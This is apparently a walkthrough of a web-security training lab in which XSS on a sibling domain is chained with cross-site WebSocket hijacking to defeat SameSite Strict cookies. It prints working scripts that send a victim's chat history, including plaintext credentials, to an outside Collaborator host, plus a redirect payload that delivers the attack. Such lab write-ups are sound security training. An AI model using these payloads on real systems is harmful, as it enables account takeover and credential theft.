
---

Whether we're testing someone else's website or trying to secure our own, it's essential to keep in mind that a request can still be same-site even if it's issued cross-origin.

We must to make sure to thoroughly audit all of the available attack surface, including any sibling domains. In particular, vulnerabilities that enable us to elicit an arbitrary secondary request, such as XSS, can compromise site-based defenses completely, exposing all of the site's domains to cross-site attacks.

In addition to classic CSRF, don't forget that if the target website supports WebSockets, this functionality might be vulnerable to cross-site WebSocket hijacking (CSWSH), which is essentially just a CSRF attack targeting a WebSocket handshake.

## Lab: SameSite Strict bypass via sibling domain

This lab's live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). To solve the lab, log in to the victim's account.

To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim's chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text.

To solve this lab, BurpSuite Pro will be used. 

We open a browser using Burp and we don't turn on Intercept.
First, we will go to the live chat page. We will see that JS page (/resources/js/chat.js.) that calls a server with a login page: cms-LAB-ID.web-security-academy.net.

If we visited this website, we will see a simple login page. We will put this XSS payload in the username to test if that page is vulnerable: ```
<script> alert(1);</script>```

We will get the alert pop-up. To make sure that this page is vulnerable, we will send the login request to Repeater and right click on it and choose change the request method. We will right click on the request and choose copy URL. If that new URL triggered a pop-up warning, we will be able to use this XSS vulnerability in our CSWSH attack.  

We will use this template to perform the CSWSH attack: ```
 ```html
 <script>
    var ws = new WebSocket('wss:LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://Collaborator-PayLoad', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
 ```

To get the Collaborator Payload, we go to Collaborator and click copy to clipboard. 
We will store this payload and view it. If we went to the Collaborator and clicked poll now, we will see that the Collaborator started a conversation with the live chat. 

Now, to put everything together, we will use the XSS vulnerability that we discovered in the cms login page to pull the conversation between the chat and another user. 

We will start by encoding the entire CSWSH payload using URL encoding.

Then, we will send this payload to our victim: 
``` html
<script>
document.location="https://cms-0a2800d403277a6182e21f5400e600d0.web-security-academy.net/login?username=(The encoded payload)&password=ANYTHING
</script>
```

We will send this to the victim and we go to the Collaborator. If we clicked Poll now, we will see the entire conversation between our victim and the chat. The user is called Carlos. 

Now, we can sign-in using the credentials that we got from the chat history.


